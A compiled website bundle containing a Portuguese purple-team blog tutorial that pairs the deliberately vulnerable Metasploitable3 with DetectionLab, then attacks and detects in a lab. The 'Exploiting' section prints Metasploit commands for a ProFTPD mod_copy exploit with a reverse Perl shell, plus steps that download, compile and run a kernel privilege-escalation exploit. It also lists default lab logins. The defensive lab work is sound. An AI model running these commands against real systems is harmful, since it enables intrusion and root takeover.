"use strict";(self.webpackChunkwebsite=self.webpackChunkwebsite||[]).push([[782],{3905:(e,a,t)=>{t.d(a,{Zo:()=>u,kt:()=>g});var o=t(7294);function n(e,a,t){return a in e?Object.defineProperty(e,a,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[a]=t,e}function i(e,a){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);a&&(o=o.filter((function(a){return Object.getOwnPropertyDescriptor(e,a).enumerable}))),t.push.apply(t,o)}return t}function l(e){for(var a=1;a<arguments.length;a++){var t=null!=arguments[a]?arguments[a]:{};a%2?i(Object(t),!0).forEach((function(a){n(e,a,t[a])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):i(Object(t)).forEach((function(a){Object.defineProperty(e,a,Object.getOwnPropertyDescriptor(t,a))}))}return e}function s(e,a){if(null==e)return{};var t,o,n=function(e,a){if(null==e)return{};var t,o,n={},i=Object.keys(e);for(o=0;o<i.length;o++)t=i[o],a.indexOf(t)>=0||(n[t]=e[t]);return n}(e,a);if(Object.getOwnPropertySymbols){var i=Object.getOwnPropertySymbols(e);for(o=0;o<i.length;o++)t=i[o],a.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(n[t]=e[t])}return n}var r=o.createContext({}),p=function(e){var a=o.useContext(r),t=a;return e&&(t="function"==typeof e?e(a):l(l({},a),e)),t},u=function(e){var a=p(e.components);return o.createElement(r.Provider,{value:a},e.children)},d="mdxType",c={inlineCode:"code",wrapper:function(e){var a=e.children;return o.createElement(o.Fragment,{},a)}},m=o.forwardRef((function(e,a){var t=e.components,n=e.mdxType,i=e.originalType,r=e.parentName,u=s(e,["components","mdxType","originalType","parentName"]),d=p(t),m=n,g=d["".concat(r,".").concat(m)]||d[m]||c[m]||i;return t?o.createElement(g,l(l({ref:a},u),{},{components:t})):o.createElement(g,l({ref:a},u))}));function g(e,a){var t=arguments,n=a&&a.mdxType;if("string"==typeof e||n){var i=t.length,l=new Array(i);l[0]=m;var s={};for(var r in a)hasOwnProperty.call(a,r)&&(s[r]=a[r]);s.originalType=e,s[d]="string"==typeof e?e:n,l[1]=s;for(var p=2;p<i;p++)l[p]=t[p];return o.createElement.apply(null,l)}return o.createElement.apply(null,t)}m.displayName="MDXCreateElement"},2809:(e,a,t)=>{t.r(a),t.d(a,{assets:()=>r,contentTitle:()=>l,default:()=>c,frontMatter:()=>i,metadata:()=>s,toc:()=>p});var o=t(7462),n=(t(7294),t(3905));const i={title:"Purple Team - Metasploitable3 & DetectionLab",authors:"imgodes",img_path:"/assets/img/meta-detec/",date:"2023-04-26 18:52:00 -0300",categories:["Cybersecurity","Attack & Detection"],tags:["pr\xe1tica","tutorial"],math:!0,toc:!0,pin:!0},l=void 0,s={permalink:"/blog/2023/04/27/meta-detec/metasploitable3-detectionlab",editUrl:"https://github.com/imgodes/imgodes.github.io/blob/main/website/blog/meta-detec/2023-04-27-metasploitable3-detectionlab.md",source:"@site/blog/meta-detec/2023-04-27-metasploitable3-detectionlab.md",title:"Purple Team - Metasploitable3 & DetectionLab",description:"Criado para adi\xe7\xe3o do Metasploitable3 (com seus logs e telemetrias) ao DetectionLab.",date:"2023-04-26T18:52:00.000Z",formattedDate:"26 de abril de 2023",tags:[{label:"pr\xe1tica",permalink:"/blog/tags/pratica"},{label:"tutorial",permalink:"/blog/tags/tutorial"}],readingTime:11.335,hasTruncateMarker:!1,authors:[{name:"G. Guedes",title:"Blue Teamer",url:"https://www.linkedin.com/in/gguedescruz/",imageURL:"https://avatars.githubusercontent.com/u/52048434?v=4",key:"imgodes"}],frontMatter:{title:"Purple Team - Metasploitable3 & DetectionLab",authors:"imgodes",img_path:"/assets/img/meta-detec/",date:"2023-04-26 18:52:00 -0300",categories:["Cybersecurity","Attack & Detection"],tags:["pr\xe1tica","tutorial"],math:!0,toc:!0,pin:!0},nextItem:{title:"M\xe1quinas virtuais para engenharia reversa (Windows)",permalink:"/blog/2023/04/23/rev-vmwin10/vms-para-eng-rev"}},r={authorsImageUrls:[void 0]},p=[{value:"Combo - Metasploitable3 &amp; DetectionLab",id:"combo---metasploitable3--detectionlab",level:2},{value:"Instala\xe7\xe3o",id:"instala\xe7\xe3o",level:2},{value:"Acessos",id:"acessos",level:2},{value:"OSQuery e Fleet",id:"osquery-e-fleet",level:2},{value:"NXLog",id:"nxlog",level:2},{value:"NXLog Input",id:"nxlog-input",level:3},{value:"NXLog Output",id:"nxlog-output",level:3},{value:"Splunk",id:"splunk",level:2},{value:"Index",id:"index",level:3},{value:"Scanning",id:"scanning",level:2},{value:"Exploiting",id:"exploiting",level:2},{value:"Detecting Scan",id:"detecting-scan",level:2},{value:"Detecting Scan - Suricata",id:"detecting-scan---suricata",level:3},{value:"Detecting Scan - Zeek",id:"detecting-scan---zeek",level:3},{value:"Detecting Exploit",id:"detecting-exploit",level:2},{value:"Detecting ProFTP Exploit - Splunk",id:"detecting-proftp-exploit---splunk",level:3},{value:"Detecting ProFTP Exploit - OSQuery",id:"detecting-proftp-exploit---osquery",level:3},{value:"Detecting Kernel Exploit Download - Splunk",id:"detecting-kernel-exploit-download---splunk",level:3}],u={toc:p},d="wrapper";function c(e){let{components:a,...i}=e;return(0,n.kt)(d,(0,o.Z)({},u,i,{components:a,mdxType:"MDXLayout"}),(0,n.kt)("p",null,"Criado para adi\xe7\xe3o do ",(0,n.kt)("a",{parentName:"p",href:"https://github.com/rapid7/metasploitable3"},"Metasploitable3")," (com seus logs e telemetrias) ao ",(0,n.kt)("a",{parentName:"p",href:"https://detectionlab.network/"},"DetectionLab"),"."),(0,n.kt)("blockquote",null,(0,n.kt)("p",{parentName:"blockquote"},"Observa\xe7\xe3o: esse guia pode ser um pouco dif\xedcil de acompanhar caso n\xe3o conhe\xe7a o Detection Lab, mas basta instala-lo uma vez que tudo ficar\xe1 mais f\xe1cil de entender.")),(0,n.kt)("h1",{id:"\xedndice"},"\xcdndice"),(0,n.kt)("h1",{id:"introdu\xe7\xe3o"},"Introdu\xe7\xe3o"),(0,n.kt)("p",null,"O Metasploitable3 \xe9 uma m\xe1quina com servi\xe7os propositalmente vulner\xe1veis. Existem v\xe1rias vers\xf5es dele, eu escolhi a terceira por ser a ",(0,n.kt)("a",{parentName:"p",href:"https://github.com/rapid7/metasploitable3/wiki#differences-between-metasploitable-3-and-the-older-versions"},"mais nova"),"."),(0,n.kt)("p",null,"J\xe1 o ",(0,n.kt)("a",{parentName:"p",href:"https://twitter.com/DetectionLab"},"DetectionLab")," \xe9 um agrupado de ferramentas de detec\xe7\xe3o e logging, que juntas se tornam um \xf3timo ambiente de testes."),(0,n.kt)("ul",null,(0,n.kt)("li",{parentName:"ul"},(0,n.kt)("a",{parentName:"li",href:"https://twitter.com/DetectionLab"},"Twitter do DetectionLab")),(0,n.kt)("li",{parentName:"ul"},(0,n.kt)("a",{parentName:"li",href:"https://github.com/clong"},"Github do Criador")),(0,n.kt)("li",{parentName:"ul"},(0,n.kt)("a",{parentName:"li",href:"https://detectionlab.network"},"Site oficial"))),(0,n.kt)("p",null,(0,n.kt)("img",{alt:"dttnlab",src:t(6124).Z,width:"3148",height:"2434"}),"\n",(0,n.kt)("em",{parentName:"p"},"Imagem retirada do site oficial - ",(0,n.kt)("a",{parentName:"em",href:"https://detectionlab.network"},"https://detectionlab.network"))),(0,n.kt)("p",null,(0,n.kt)("strong",{parentName:"p"},"Pontos importantes"),":"),(0,n.kt)("ul",null,(0,n.kt)("li",{parentName:"ul"},"O tr\xe1fego de rede \xe9 loggado pelo Zeek;"),(0,n.kt)("li",{parentName:"ul"},"Suricata \xe9 um IDS, um IPS, um NSM e processador de captura de pacotes open source, ele trabalha junto com o Zeek na an\xe1lise de tr\xe1fego;"),(0,n.kt)("li",{parentName:"ul"},"O Velociraptor e o OSQuery nos apoiam quanto a an\xe1lise do endpoint e ambos possuem sua pr\xf3pria interface web;"),(0,n.kt)("li",{parentName:"ul"},"O OSQuery consegue fazer consultas de baixo n\xedvel do SO. ",(0,n.kt)("ul",{parentName:"li"},(0,n.kt)("li",{parentName:"ul"},"Ele exp\xf5e as informa\xe7\xf5es do SO \xe1 um banco de dados que pode ser consultado por uma interface web chamada Fleet;"),(0,n.kt)("li",{parentName:"ul"},"Apesar ter sua pr\xf3pria interface web, o OsQuery envia logs dos resultados das consultas (",(0,n.kt)("inlineCode",{parentName:"li"},"index=osquery"),") e tamb\xe9m de status dele mesmo (INFO/WARN/ERROR). "))),(0,n.kt)("li",{parentName:"ul"},"Todos esses logs podem ser consultados no Splunk.")),(0,n.kt)("h2",{id:"combo---metasploitable3--detectionlab"},"Combo - Metasploitable3 & DetectionLab"),(0,n.kt)("p",null,"Combinando a capacidade de detec\xe7\xe3o e investiga\xe7\xe3o do Splunk + OSQuery, com os futuros ataques feitos ao servidor vulner\xe1vel, ganhamos a capacidade de identificar as etapas do ataque. Mas antes de seguir com a pr\xe1tica, temos que entender como os componentes interagem, que ap\xf3s as minhas customiza\xe7\xf5es, passa a funcionar da seguinte forma:\n",(0,n.kt)("img",{alt:"combopng",src:t(9955).Z,width:"2052",height:"1641"}),"\n",(0,n.kt)("em",{parentName:"p"},"Desenho da arquitetura do lab do ponto de vista das funcionalidades")," "),(0,n.kt)("p",null,"Observa\xe7\xf5es:"),(0,n.kt)("ul",null,(0,n.kt)("li",{parentName:"ul"},"Configurei o envio dos logs do apache para o Splunk via NXLog (mais detalhes em ",(0,n.kt)("a",{parentName:"li",href:"#nxlog"},"NXLog"),");"),(0,n.kt)("li",{parentName:"ul"},"Configurei a coleta de telemetrias pelo OSQuery (mais detalhes em ",(0,n.kt)("a",{parentName:"li",href:"#osquery-e-fleet"},"OSQuery e Fleet"),");"),(0,n.kt)("li",{parentName:"ul"},"Instalei uma VM do Kali para efetuar os ataques;"),(0,n.kt)("li",{parentName:"ul"},"Desliguei as m\xe1quinas windows do DetectionLab pois n\xe3o iam ser usadas;"),(0,n.kt)("li",{parentName:"ul"},(0,n.kt)("em",{parentName:"li"},"O agente do Velociraptor ainda n\xe3o est\xe1 configurado no Metasploitable, portanto seguimos apenas com o OSQuery."))),(0,n.kt)("h1",{id:"setup-tltr---too-lazy-to-read"},"Setup TLTR - Too lazy to read"),(0,n.kt)("p",null,"Se voc\xea estiver com pressa, ou j\xe1 saiba como tudo isso funciona, basta seguir o passos abaixo."),(0,n.kt)("blockquote",null,(0,n.kt)("p",{parentName:"blockquote"},"Caso desconhe\xe7a as ferramentas acima, recomendo ler um pouco antes de tentar instalar e configurar.\n{: .prompt-info}")),(0,n.kt)("h2",{id:"instala\xe7\xe3o"},"Instala\xe7\xe3o"),(0,n.kt)("p",null,(0,n.kt)("strong",{parentName:"p"},"Com o detectionlab j\xe1 INSTALADO e funcionando use os comandos abaixo:")),(0,n.kt)("pre",null,(0,n.kt)("code",{parentName:"pre",className:"language-shell"},"git clone https://github.com/imgodes/DetectionLabMetasploitable3.git\ncd DetectionLabMetasploitable3\nvagrant up\n")),(0,n.kt)("p",null,"Crie um index no Splunk chamado ",(0,n.kt)("inlineCode",{parentName:"p"},"syslog"),".\nExplica\xe7\xe3o detalhada em ",(0,n.kt)("a",{parentName:"p",href:"#index"},"index"),"."),(0,n.kt)("h2",{id:"acessos"},"Acessos"),(0,n.kt)("ul",null,(0,n.kt)("li",{parentName:"ul"},"Fleet login: ",(0,n.kt)("a",{parentName:"li",href:"https://192.168.56.105:8412"},"https://192.168.56.105:8412")," - ",(0,n.kt)("a",{parentName:"li",href:"mailto:admin@detectionlab.network"},"admin@detectionlab.network"),":Fl33tpassword!"),(0,n.kt)("li",{parentName:"ul"},"Splunk login: ",(0,n.kt)("a",{parentName:"li",href:"https://192.168.56.105:8000"},"https://192.168.56.105:8000")," - admin:changeme"),(0,n.kt)("li",{parentName:"ul"},"Velociraptor login: ",(0,n.kt)("a",{parentName:"li",href:"https://192.168.56.105:9999"},"https://192.168.56.105:9999")," - admin:changeme"),(0,n.kt)("li",{parentName:"ul"},"Metasploitable3 em ",(0,n.kt)("a",{parentName:"li",href:"http://192.168.56.210"},"http://192.168.56.210")," - vagrant:vagrant")),(0,n.kt)("blockquote",null,(0,n.kt)("p",{parentName:"blockquote"},"Agora vamos a apresenta\xe7\xe3o das customiza\xe7\xf5es feitas. Lembrando que \xe9 tudo meramente informativo, afinal, ser\xe1 configurado automaticamente ap\xf3s executar ",(0,n.kt)("inlineCode",{parentName:"p"},"vagrant up"),"(exceto a configura\xe7\xe3o do index do Splunk).\n{: .prompt-danger}")),(0,n.kt)("h1",{id:"logging"},"Logging"),(0,n.kt)("p",null,"O Metasploitable \xe9 somente uma m\xe1quina vulner\xe1vel alvo do nosso ataque, ent\xe3o sozinha, seria dif\xedcil de investigar e identificar a atividade maliciosa. Por essa raz\xe3o, instalei o OSQuery e o NXLog no Metasploitable. Essas ferramentas v\xe3o nos das a capacidade: "),(0,n.kt)("ul",null,(0,n.kt)("li",{parentName:"ul"},(0,n.kt)("strong",{parentName:"li"},"OSQuery")," \ud83d\udc49 Consultar processos, pastas, arquivos, comandos usados, modifica\xe7\xf5es, sockets de rede e muitas outras informa\xe7\xf5es sobre o sistema operacional em tempo real, por meio de comandos SQL;",(0,n.kt)("ul",{parentName:"li"},(0,n.kt)("li",{parentName:"ul"},"Pode ser consultado pela interface web do Fleet, ou pelo pr\xf3prio OSQuery mesmo (dentro da m\xe1quina do Metasploitable);"))),(0,n.kt)("li",{parentName:"ul"},(0,n.kt)("strong",{parentName:"li"},"NXLog")," \ud83d\udc49 Envio de logs de m\xe1quina ao Splunk;"),(0,n.kt)("li",{parentName:"ul"},(0,n.kt)("strong",{parentName:"li"},"Splunk")," \ud83d\udc49 Consulta de logs de maneira centralizada.")),(0,n.kt)("p",null,(0,n.kt)("img",{alt:"detectionlab_simples-logging.drawio.png",src:t(7819).Z,width:"614",height:"382"}),"\n",(0,n.kt)("em",{parentName:"p"},"Desenho da arquitetura do lab do ponto de vista do logging")," "),(0,n.kt)("h2",{id:"osquery-e-fleet"},"OSQuery e Fleet"),(0,n.kt)("p",null,"O OSQuery \xe9 uma ferramenta que permite consultar informa\xe7\xf5es do SO. "),(0,n.kt)("p",null,"J\xe1 o Fleet \xe9 um gerenciador de OSQuery open source, com ele podemos gerenciar e consultar o OSQuery em v\xe1rios dispositivos por meio de uma interface web."),(0,n.kt)("p",null,'Processos, opera\xe7\xf5es de rede, e muitas outras coisas podem ser consultas. Para a alegria do brasileiro m\xe9dio, existem  muitos "packs de consultas" prontos voltados para identifica\xe7\xe3o de ataques. Esses packs, s\xe3o queries prontas, basta executa-las. '),(0,n.kt)("blockquote",null,(0,n.kt)("p",{parentName:"blockquote"},"Exemplos - ",(0,n.kt)("a",{parentName:"p",href:"https://github.com/osquery/osquery/tree/master/packs"},"OSQuery packs oficiais"),", ",(0,n.kt)("a",{parentName:"p",href:"https://github.com/palantir/osquery-configuration/tree/master"},"Palantir Packs"))),(0,n.kt)("ul",null,(0,n.kt)("li",{parentName:"ul"},'Os "agentes" do OSQuery s\xe3o registrados no Fleet.',(0,n.kt)("ul",{parentName:"li"},(0,n.kt)("li",{parentName:"ul"},"As consultas e configura\xe7\xf5es do agente Osquery s\xe3o fornecidas pelo Fleet atrav\xe9s de uma conex\xe3o TLS.  "))),(0,n.kt)("li",{parentName:"ul"},"A configura\xe7\xe3o do agente \xe9 definida pelo arquivo ",(0,n.kt)("inlineCode",{parentName:"li"},"osquery.flags"),"{: .filepath} "),(0,n.kt)("li",{parentName:"ul"},"O nosso Fleet do DetectionLab \xe9 pr\xe9-configurado com os arquivos do ",(0,n.kt)("a",{parentName:"li",href:"https://github.com/palantir/osquery-configuration"},"Palantir"),". "),(0,n.kt)("li",{parentName:"ul"},"As op\xe7\xf5es ativadas no arquivo de ",(0,n.kt)("inlineCode",{parentName:"li"},"osquery.flags"),"{: .filepath} s\xe3o as do pr\xf3prio Palantir, e n\xe3o alterei nada, apenas peguei do reposit\xf3rio deles. "),(0,n.kt)("li",{parentName:"ul"},"De acordo com o reposit\xf3rio do Palantir, \xe9 esperado que hosts Linux tenham o arquivo ",(0,n.kt)("a",{parentName:"li",href:"https://github.com/palantir/osquery-configuration/blob/master/Classic/Servers/Linux/packs/ossec-rootkit.conf"},"ossec-rootkit.conf")," em ",(0,n.kt)("inlineCode",{parentName:"li"},"/etc/osquery/packs/ossec-rootkit.conf"),"{: .filepath} isso \xe9 garantido pelo vagrant quando executamos ",(0,n.kt)("inlineCode",{parentName:"li"},"vagrant up"),"."),(0,n.kt)("li",{parentName:"ul"},"A op\xe7\xe3o user_events \xe9 desabilitada por padr\xe3o, pois de acordo com a documenta\xe7\xe3o \xe9 redundante.",(0,n.kt)("blockquote",{parentName:"li"},(0,n.kt)("p",{parentName:"blockquote"},'"On Linux, a companion table called user_events is included that provides several authentication-based events. If you are enabling process auditing it should be trivial to also include this table" - ',(0,n.kt)("a",{parentName:"p",href:"https://osquery.readthedocs.io/en/stable/deployment/process-auditing/"},"User event auditing with Audit"))))),(0,n.kt)("h2",{id:"nxlog"},"NXLog"),(0,n.kt)("p",null,"O NXLog \xe9 minha ferramenta favorita para encaminhamento de logs. NXLog pode processar eventos de milhares de fontes diferentes, funciona em sistemas antigos e novos. \xc9 capaz de processar um volume absurdo de logs (de acordo com a ",(0,n.kt)("a",{parentName:"p",href:"https://docs.nxlog.co/userguide/intro/about-nxlog.html"},"documenta\xe7\xe3o"),"). Trabalha bem com diversos protocolos de rede, transporte, e criptografias, al\xe9m de suportar  tamb\xe9m de formatos de logs dos mais variados (Syslog, Windows Event Log, JSON, etc). E mesmo que n\xe3o tenha alguma predefini\xe7\xe3o, ainda \xe9 poss\xedvel fazer o parsing manualmente."),(0,n.kt)("p",null,"Ent\xe3o iremos instalar o NXLog no Metasploitable3, para o parsing inicial, e envio dos logs do apache para o Splunk. A configura\xe7\xe3o do NXLog \xe9 toda centralizada no arquivo ",(0,n.kt)("inlineCode",{parentName:"p"},"nxlog.conf"),"{: .filepath}. "),(0,n.kt)("ul",null,(0,n.kt)("li",{parentName:"ul"},"A minha configura\xe7\xe3o est\xe1 dispon\xedvel no ",(0,n.kt)("a",{parentName:"li",href:"https://raw.githubusercontent.com/imgodes/DetectionLabMetasploitable3/master/nxlog.conf"},"github"),";"),(0,n.kt)("li",{parentName:"ul"},"O agente do NXlog usado \xe9 o 2.10 para Ubuntu 14.04 (trusty);")),(0,n.kt)("p",null,"O agente do NXLog consegue ler alguma entrada (",(0,n.kt)("a",{parentName:"p",href:"#nxlog-input"},"Input"),"), manipula-la (Exec) e enviar para alguma sa\xedda(",(0,n.kt)("a",{parentName:"p",href:"#nxlog-output"},"Output e Route"),"). Essas diretrizes s\xe3o definidas todas no mesmo arquivo ",(0,n.kt)("inlineCode",{parentName:"p"},"nxlog.conf"),"{: .filepath}."),(0,n.kt)("h3",{id:"nxlog-input"},"NXLog Input"),(0,n.kt)("p",null,"\xc9 a entrada dos logs, nesse caso um arquivo."),(0,n.kt)("ul",null,(0,n.kt)("li",{parentName:"ul"},"Configurei o NXLog para ler os logs do apache em ",(0,n.kt)("inlineCode",{parentName:"li"},"/var/log/apache2/access.log"),"{: .filepath};"),(0,n.kt)("li",{parentName:"ul"},"Fiz uma regex para fazer o parsing dos campos do apache;",(0,n.kt)("ul",{parentName:"li"},(0,n.kt)("li",{parentName:"ul"},"Essas configura\xe7\xf5es est\xe3o de acordo com as configura\xe7\xf5es de logging que declarei no arquivo ",(0,n.kt)("inlineCode",{parentName:"li"},"apache2.conf"),", caso altere, lembre de alterar manter a concord\xe2ncia entre eles.")))),(0,n.kt)("pre",null,(0,n.kt)("code",{parentName:"pre",className:"language-xml"},'<Input apache_access>\n    Module im_file\n    File        "/var/log/apache2/access.log"\n    <Exec>\n        if $raw_event =~ /(?x)^(\\S+)\\ \\S+\\ (\\S+)\\ \\[([^\\]]+)\\]\\ \\"(\\S+)\\ (.+)\n                          \\ HTTP\\/\\d\\.\\d\\"\\ (\\S+)\\ (\\S+)\\ \\"([^\\"]+)\\"\n                          \\ \\"([^\\"]+)\\"/\n        {\n            $Hostname = $1;\n            if $2 != \'-\' $AccountName = $2;\n            $EventTime = parsedate($3);\n            $HTTPMethod = $4;\n            $HTTPURL = $5;\n            $HTTPResponseStatus = $6;\n            if $7 != \'-\' $FileSize = $7;\n            if $8 != \'-\' $HTTPReferer = $8;\n            if $9 != \'-\' $HTTPUserAgent = $9;\n        }\n    </Exec> \n</Input>\n')),(0,n.kt)("p",null,"{: file='/etc/nxlog/nxlog.conf'}"),(0,n.kt)("h3",{id:"nxlog-output"},"NXLog Output"),(0,n.kt)("p",null,"Aqui configuramos o que vem do Input e vai para o Splunk."),(0,n.kt)("ul",null,(0,n.kt)("li",{parentName:"ul"},"Digo que sa\xedda usar\xe1 a porta ",(0,n.kt)("inlineCode",{parentName:"li"},"514/UDP")," sendo que o destino ser\xe1 o IP do servidor Splunk;"),(0,n.kt)("li",{parentName:"ul"},"Executo a fun\xe7\xe3o ",(0,n.kt)("inlineCode",{parentName:"li"},"drop()")," para descartar logs cujo o hostname vem como ipv4 de loopback (isso estava floodando o Splunk de eventos);"),(0,n.kt)("li",{parentName:"ul"},"Executo a fun\xe7\xe3o ",(0,n.kt)("inlineCode",{parentName:"li"},"to_json()")," para converter o log para o formato JSON.")),(0,n.kt)("pre",null,(0,n.kt)("code",{parentName:"pre",className:"language-xml"},"<Output syslog_udp>\n    Module     om_udp\n    Host       192.168.56.105\n    PORT       514 \n    <Exec>\n        if ($Hostname == '127.0.0.1') drop();\n        to_json();\n    </Exec>\n</Output>\n\n<Route 1>\n    Path apache_access => syslog_udp\n</Route>\n")),(0,n.kt)("p",null,"{: file='/etc/nxlog/nxlog.conf'}"),(0,n.kt)("h2",{id:"splunk"},"Splunk"),(0,n.kt)("p",null,"Os logs s\xe3o enviados ao Splunk por meio do agente do ",(0,n.kt)("a",{parentName:"p",href:"https://nxlog.co/"},"NXLog")," pela porta ",(0,n.kt)("inlineCode",{parentName:"p"},"514/udp"),' e caem no index chamado "syslog". O problema \xe9 que esse index ainda n\xe3o existe. Teremos que configura-lo na m\xe3o.'),(0,n.kt)("h3",{id:"index"},"Index"),(0,n.kt)("p",null,"Para configurar um index configurar um index. Basta clicar em ",(0,n.kt)("inlineCode",{parentName:"p"},"Settings")," > ",(0,n.kt)("inlineCode",{parentName:"p"},"Indexes")," > ",(0,n.kt)("inlineCode",{parentName:"p"},"New Index")),(0,n.kt)("p",null,(0,n.kt)("img",{alt:"settings",src:t(6028).Z,width:"658",height:"586"}),'{: width="400" heigth="400"} '),(0,n.kt)("p",null,"Depois basta colocar o nome e dale:"),(0,n.kt)("p",null,(0,n.kt)("img",{alt:"index",src:t(8033).Z,width:"808",height:"802"}),'{: width="400" heigth="400"}'),(0,n.kt)("p",null,"Feito isso seu lab est\xe1 pronto para a maldade."),(0,n.kt)("h1",{id:"attack"},"Attack"),(0,n.kt)("p",null,"O ataque n\xe3o foi grande coisa. Meu foco era ver como a o ataque poderia ser observado nos logs a fim de exemplificar como pode ser usado."),(0,n.kt)("h2",{id:"scanning"},"Scanning"),(0,n.kt)("p",null,"Um scan simples com nmap para come\xe7ar."),(0,n.kt)("pre",null,(0,n.kt)("code",{parentName:"pre",className:"language-shell"},"nmap -sV -p- 192.168.56.210\n")),(0,n.kt)("p",null,'{: file="Shell Kali"}'),(0,n.kt)("p",null,(0,n.kt)("img",{alt:"nmap",src:t(8061).Z,width:"983",height:"384"})),(0,n.kt)("p",null,"Haviam v\xe1rios vetores de ataque, fui no primeiro que li na tela rsrs."),(0,n.kt)("p",null,"Ao ver a combina\xe7\xe3o do ProFTP + Apache, podemos supor que temos permiss\xe3o de grava\xe7\xe3o no SITEPATH. Ent\xe3o, se explorarmos o servi\xe7o ProFTPD podemos abusar da permiss\xe3o no Apache SITEPATH, o que nos permitir\xe1 obter shell reverso. Mas l\xf3gico que tudo isso \xe9 autom\xe1tico rs, eu s\xf3 vou aperta um bot\xe3o. "),(0,n.kt)("h2",{id:"exploiting"},"Exploiting"),(0,n.kt)("p",null,"Usando o ",(0,n.kt)("inlineCode",{parentName:"p"},"msfconsole")," > ",(0,n.kt)("inlineCode",{parentName:"p"},"search proftp")," e encontrei o exploit ",(0,n.kt)("a",{parentName:"p",href:"https://www.exploit-db.com/exploits/37262"},"modcopy execution"),"."),(0,n.kt)("pre",null,(0,n.kt)("code",{parentName:"pre",className:"language-shell"},"use proftpd_modcopy_exec\nset RHOST 192.168.56.210\nset TARGETURI /\nset SITEPATH /var/www/html/\nset payload payload/cmd/unix/reverse_perl\nset LHOST 192.168.56.109\nexploit\n")),(0,n.kt)("p",null,'{: file="Shell Kali"}\n',(0,n.kt)("img",{alt:"proftp-exploit.png",src:t(597).Z,width:"946",height:"395"})),(0,n.kt)("p",null,"Agora com acesso ao shell, podemos escalonar privil\xe9gio.\nA hist\xf3ria \xe9 mais longa do que isso, mas resumindo, usei um exploit para aquele kernel em espec\xedfico."),(0,n.kt)("p",null,"No Kali Linux executei uma busca por aquela vers\xe3o do kernel no exploitdb, e deixei o c\xf3digo malicioso dispon\xedvel para download. "),(0,n.kt)("pre",null,(0,n.kt)("code",{parentName:"pre",className:"language-shell"},"searchsploit linux local kernel 3.13 ubuntu 14.04\nsearchsploit -m 37292.c\nmv 37292.c /tmp\npython3 -m http.server 80\n")),(0,n.kt)("p",null,'{: file="Shell Kali"}'),(0,n.kt)("p",null,(0,n.kt)("img",{alt:"searchsploit.png",src:t(5614).Z,width:"939",height:"402"})),(0,n.kt)("p",null,"Voltando a console que ganhamos acesso com o usu\xe1rio www-data, vamos baixar o exploit."),(0,n.kt)("pre",null,(0,n.kt)("code",{parentName:"pre",className:"language-shell"},"wget 192.168.56.109/37292.c\ncd tmp\ngcc 37292.c -o salve\n./salve\nwhoami\n")),(0,n.kt)("p",null,'{: file="Shell Web Server"}'),(0,n.kt)("p",null,(0,n.kt)("img",{alt:"salve",src:t(3687).Z,width:"674",height:"220"})),(0,n.kt)("p",null,"Aqui \xe9 o fim da explora\xe7\xe3o, vamos ao lado azul da for\xe7a ver o que foi loggado ao longo do processo. "),(0,n.kt)("h1",{id:"detect"},"Detect"),(0,n.kt)("p",null,"Vou me basear no Mitre ATT&CK para descrever a t\xe9cnica usada, e no cyber kill chain para descrever os momentos do ataque. Clique na imagem abaixo para verificar o gr\xe1fico."),(0,n.kt)("p",null,(0,n.kt)("img",{alt:"DectEng.png",src:t(2596).Z,width:"1353",height:"699"})),(0,n.kt)("ul",null,(0,n.kt)("li",{parentName:"ul"},"A curva vai de T\u2080/M\u2080 \xe1 M\u0562/T\u0562;"),(0,n.kt)("li",{parentName:"ul"},"Observe que para cada tempo T\u209b, temos diferentes capacidades de detec\xe7\xe3o variando de acordo com a ferramenta que registra aquele momento M\u209b do atacante.")),(0,n.kt)("h2",{id:"detecting-scan"},"Detecting Scan"),(0,n.kt)("h3",{id:"detecting-scan---suricata"},"Detecting Scan - Suricata"),(0,n.kt)("p",null,"A seguinte search poderia ser feita para identificar quais origens tem feito comunica\xe7\xe3o com o web server e quais alertas foram gerados pelo Suricata."),(0,n.kt)("pre",null,(0,n.kt)("code",{parentName:"pre",className:"language-sql"},'index=* dest_ip="192.168.56.210"\n| stats values(src_ip), values(dest_ip), values(dest_port), values(app_proto), values(alert.signature) by src_ip, alert.category\n')),(0,n.kt)("p",null,'{: file="Splunk Search"}'),(0,n.kt)("p",null,(0,n.kt)("img",{alt:"suricata",src:t(3770).Z,width:"1912",height:"593"}),"\n",(0,n.kt)("em",{parentName:"p"},"clique na imagem para expandir")),(0,n.kt)("blockquote",null,(0,n.kt)("p",{parentName:"blockquote"},"Existem outros logs de quando eu ainda estava testando o laborat\xf3rio, mas a explora\xe7\xe3o foi feita pelo IP final .109. ")),(0,n.kt)("h3",{id:"detecting-scan---zeek"},"Detecting Scan - Zeek"),(0,n.kt)("p",null,"Com as informa\xe7\xf5es da busca anterior, podemos ver com quantos bytes foram trafegados entre os hosts:"),(0,n.kt)("pre",null,(0,n.kt)("code",{parentName:"pre",className:"language-sql"},'index=*  id.orig_h="192.168.56.109" id.resp_h="192.168.56.210" sourcetype="zeek:json" \n| bin span=3min _time \n| stats values(id.orig_h), values(id.resp_h), values(id.resp_p), sum(orig_ip_bytes), sum(resp_ip_bytes) by _time\n')),(0,n.kt)("p",null,'{: file="Splunk Search"}'),(0,n.kt)("p",null,(0,n.kt)("img",{alt:"zeek",src:t(3770).Z,width:"1912",height:"593"}),"\n",(0,n.kt)("em",{parentName:"p"},"clique na imagem para expandir")),(0,n.kt)("p",null,"Vemos um volume absurdo de varia\xe7\xe3o de portas destino e tamb\xe9m dos bytes trafegados."),(0,n.kt)("h2",{id:"detecting-exploit"},"Detecting Exploit"),(0,n.kt)("h3",{id:"detecting-proftp-exploit---splunk"},"Detecting ProFTP Exploit - Splunk"),(0,n.kt)("p",null,"Pelos logs do apache podemos buscar pelo IP do atacante e separar as requisi\xe7\xf5es pelo c\xf3digo de retorno."),(0,n.kt)("pre",null,(0,n.kt)("code",{parentName:"pre",className:"language-sql"},'index="syslog" Hostname="192.168.56.109" \n| eval decodedHTTPURL=urldecode(HTTPURL)\n| stats values(HTTPMethod), values(decodedHTTPURL) by HTTPResponseStatus, HTTPUserAgent\n')),(0,n.kt)("p",null,'{: file="Splunk Search"}'),(0,n.kt)("p",null,(0,n.kt)("img",{alt:"apacheperl",src:t(3287).Z,width:"1899",height:"867"})),(0,n.kt)("p",null,"Encontramos a requisi\xe7\xe3o maliciosa."),(0,n.kt)("p",null,"Pelos logs do zeek, temos evidencias das conex\xf5es na porta 4444, confirmando o sucesso 